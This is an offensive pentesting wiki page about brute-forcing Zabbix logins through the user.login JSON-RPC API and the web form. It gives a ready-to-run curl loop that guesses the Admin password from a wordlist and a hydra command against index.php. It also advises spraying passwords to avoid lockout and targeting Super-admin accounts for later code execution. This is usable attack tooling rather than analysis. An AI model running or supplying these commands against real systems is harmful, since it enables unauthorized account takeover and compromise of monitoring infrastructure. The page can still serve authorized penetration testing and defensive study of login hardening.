---
title: "Brute force: online attacks on the Zabbix login"
description: "Zabbix validates credentials at the web login and the JSON-RPC API, both scriptable for online brute force. Older versions lack lockout, making guessing practical; newer ones add a configurable lockout. The API is the efficient target, returning a clear success token or an error per attempt, so a wordlist against a known account runs quickly."
keywords:
  - zabbix brute force
  - api login
  - user.login
  - lockout
  - hydra
---

# Brute force

Both the Zabbix web login (`index.php`) and the API (`user.login`) validate credentials and are scriptable, so online brute force is straightforward. The API is the cleaner target: each `user.login` returns either a session token (success) or a distinct error (failure), so a wordlist against a known account is easy to automate and parse. Older Zabbix versions apply no account lockout, making sustained guessing viable; newer versions added a configurable login-attempt lockout, so against those, spray a few likely passwords rather than brute-forcing one account. As always, a Super-admin hit is the goal because it leads to code execution.

```bash
Z=https://<target>/zabbix/api_jsonrpc.php; H='Content-Type: application/json-rpc'
# brute one account via the API (parse for a token = success)
while read p; do
  r=$(curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"'"$p"'"},"id":1}')
  echo "$r" | grep -q '"result"' && { echo "FOUND: $p"; break; }
done < wordlist.txt
# hydra against the web form is an alternative
hydra -l Admin -P wordlist.txt <target> https-post-form \
  "/zabbix/index.php:name=^USER^&password=^PASS^&enter=Sign+in:incorrect"
```

## Exploitation notes

- The API's clear success/failure (token vs error) makes it the efficient brute-force surface; the web form works too but requires parsing the response for the failure string.
- Check the [version](../enumeration/version-detection.md) for lockout: older versions have none (brute force freely), newer ones lock after configurable failures (spray instead to avoid locking accounts).
- Target the Super-admin account(s) identified in [user enumeration](../enumeration/user.md); a non-admin hit is less valuable.
- A recovered token/credential routes to [enumeration](../enumeration/index.md) of hosts/macros and to [code execution](../code-execution/index.md).

## Tools

- [hydra](https://github.com/vanhauser-thc/thc-hydra)

## References

- [Zabbix API: user.login](https://www.zabbix.com/documentation/current/en/manual/api/reference/user/login)
- [HackTricks: Zabbix](https://book.hacktricks.xyz/network-services-pentesting/pentesting-zabbix)
